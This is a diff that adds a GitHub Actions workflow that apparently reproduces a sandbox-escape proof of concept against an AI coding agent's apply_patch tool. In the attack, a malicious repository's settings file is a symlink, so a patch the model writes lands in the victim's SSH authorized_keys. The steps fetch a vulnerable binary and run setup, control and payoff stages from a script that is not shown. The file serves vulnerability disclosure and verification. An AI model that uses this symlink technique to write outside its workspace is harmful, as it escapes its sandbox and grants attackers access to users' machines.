@@ -1,0 +1,35 @@
+name: applypatch-sandbox-escape
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  attack-chain:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Fetch apply_patch binary (vulnerable commit 325123ae — or build from source to verify)
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          mkdir -p bin
+          gh release download binaries-325123a --repo mariokam/codex-applypatch-poc --pattern 'appatch_bin2.tgz' -O - | tar xz
+          chmod +x apply_patch-macos
+          mv apply_patch-macos bin/apply_patch
+      - name: ATTACKER publishes the malicious repo (project_settings.json -> victim authorized_keys symlink)
+        run: |
+          export CODEX_DIR="$PWD/bin"
+          ./ci/ci_apply_patch_poc.sh setup
+      - name: CONTROL - in-workspace write works normally
+        run: |
+          export CODEX_DIR="$PWD/bin"
+          ./ci/ci_apply_patch_poc.sh control
+      - name: ATTACK - model apply_patch follows the symlink into the victim's authorized_keys
+        run: |
+          export CODEX_DIR="$PWD/bin"
+          ./ci/ci_apply_patch_poc.sh payoff
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: applypatch-evidence
+          path: out/**
